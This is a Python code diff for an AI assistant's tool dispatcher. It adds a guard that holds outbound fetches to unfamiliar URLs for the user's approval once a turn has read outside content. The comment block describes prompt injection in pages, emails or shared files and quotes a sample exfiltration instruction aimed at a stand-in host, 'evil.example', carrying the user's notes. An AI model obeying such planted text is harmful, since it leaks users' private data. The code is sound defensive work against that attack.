@@ -9,10 +9,12 @@ need to spin up the chat router.
 from __future__ import annotations
 
 import abc
+import re
 import uuid
 from collections.abc import Callable
 from dataclasses import dataclass, field
 from typing import Any
+from urllib.parse import urlsplit
 
 from sqlalchemy.ext.asyncio import AsyncSession
 
@@ -167,8 +169,7 @@ class Tool(abc.ABC):
     # Wall-clock budget for one ``run()`` invocation, enforced at the
     # dispatch layer with ``asyncio.timeout``. ``None`` means the
     # dispatcher trusts the tool's own internal timeouts (only
-    # appropriate when those exist and are tighter — see
-    # ``code_interpreter``, whose sandbox owns the budget). On expiry
+    # appropriate when those exist and are tighter). On expiry
     # the call is cancelled and surfaced to the model as a controlled
     # "timed out" tool error, so one hung DNS lookup or stalled
     # provider can no longer wedge the whole turn.
@@ -212,7 +213,7 @@ class Tool(abc.ABC):
 UNTRUSTED_CONTENT_TOOLS = frozenset(
     {
         "fetch_url", "web_search", "deep_research", "run_agents",
-        "read_workspace_item", "query_board_cards", "code_interpreter",
+        "read_workspace_item", "query_board_cards",
         # File text — including files other people shared (WP-5.2/5.3).
         "search_my_files", "read_file", "list_my_files",
         # Other people's messages in Rooms.
@@ -265,5 +266,105 @@ def guard_write(ctx: ToolContext, doing: str, *, own_attachments_ok: bool = Fals
     if not turn or not turn.get("untrusted") or turn.get("user_approved"):
         return
     if own_attachments_ok and turn.get("own_attachments_only"):
+        return
+    raise HoldForApproval(doing)
+
+
+# ---------------------------------------------------------------- outbound
+# Security review H2: a page, an email or a shared file can tell the model to
+# send what it has seen somewhere ("open https://evil.example/?d=<the user's
+# notes>"). On a turn whose earlier steps read outside content, ``fetch_url``
+# to an address the person didn't give (in their own message, or this turn's
+# search results) waits for the person's yes, through the same approval card
+# as held writes.
+#
+# What counts is what the turn had read *before* the current step: calls in
+# one step run together, so a fetch can't have been steered by a page read
+# alongside it. The dispatcher records that as ``turn["before_step"]``; paths
+# without it (headless runs) use the turn as it stands.
+
+_URL_RE = re.compile(r"(?:https?://|www\.)[^\s<>\"'`)\]}]+|\b(?:[a-z0-9-]+\.)+[a-z]{2,24}/[^\s<>\"'`)\]}]*", re.I)
+
+
+def url_key(url: str) -> str | None:
+    """Compare addresses the way a person means them: scheme, ``www.``, a
+    fragment and a trailing slash don't make a different page."""
+    raw = (url or "").strip().rstrip(".,;:!?")
+    if not raw:
+        return None
+    if not re.match(r"^[a-z][a-z0-9+.-]*://", raw, re.I):
+        raw = "http://" + raw
+    try:
+        parts = urlsplit(raw)
+    except ValueError:
+        return None
+    host = (parts.hostname or "").lower()
+    if not host:
+        return None
+    if host.startswith("www."):
+        host = host[4:]
+    port = f":{parts.port}" if parts.port and parts.port not in (80, 443) else ""
+    path = parts.path.rstrip("/")
+    query = f"?{parts.query}" if parts.query else ""
+    return f"{host}{port}{path}{query}"
+
+
+def urls_in(text: str | None) -> set[str]:
+    """The addresses written in a piece of text, as :func:`url_key` keys."""
+    out: set[str] = set()
+    for m in _URL_RE.finditer(text or ""):
+        k = url_key(m.group(0))
+        if k:
+            out.add(k)
+    return out
+
+
+def allow_urls(turn: dict[str, Any] | None, urls: Any) -> None:
+    """Addresses the person gave or this turn's search found: opening them
+    never waits for a yes."""
+    if turn is None:
+        return
+    keys = turn.get("allowed_urls")
+    if not isinstance(keys, set):
+        keys = set()
+        dict.__setitem__(turn, "allowed_urls", keys)
+    for u in urls or ():
+        k = url_key(str(u))
+        if k:
+            keys.add(k)
+
+
+def note_sources(turn: dict[str, Any] | None, sources: Any) -> None:
+    """A search's results (``ToolResult.sources``) become openable."""
+    allow_urls(turn, [s.get("url") for s in (sources or []) if isinstance(s, dict) and s.get("url")])
+
+
+def url_allowed(turn: dict[str, Any] | None, url: str) -> bool:
+    k = url_key(url)
+    return bool(k and turn and k in (turn.get("allowed_urls") or ()))
+
+
+def start_step(turn: dict[str, Any] | None, tool_names: Any) -> None:
+    """Called once per step, before its calls run: remember what the turn
+    had read so far (``before_step``), then mark it for what this step
+    reads."""
+    if turn is None:
+        return
+    dict.__setitem__(turn, "before_step", {"untrusted": bool(turn.get("untrusted"))})
+    if any(reads_outside_content(n or "") for n in tool_names):
+        turn["untrusted"] = True
+
+
+def guard_outbound(ctx: ToolContext, doing: str, *, url: str) -> None:
+    """Hold an outbound call on a steered turn (see above). ``url`` is the
+    page to open: fine when the person gave it or a search found it this
+    turn; any outside content read before this step counts."""
+    turn = ctx.turn
+    if not turn or turn.get("user_approved"):
+        return
+    before = turn.get("before_step")
+    if not isinstance(before, dict):
+        before = {"untrusted": bool(turn.get("untrusted"))}
+    if not before.get("untrusted") or url_allowed(turn, url):
         return
     raise HoldForApproval(doing)
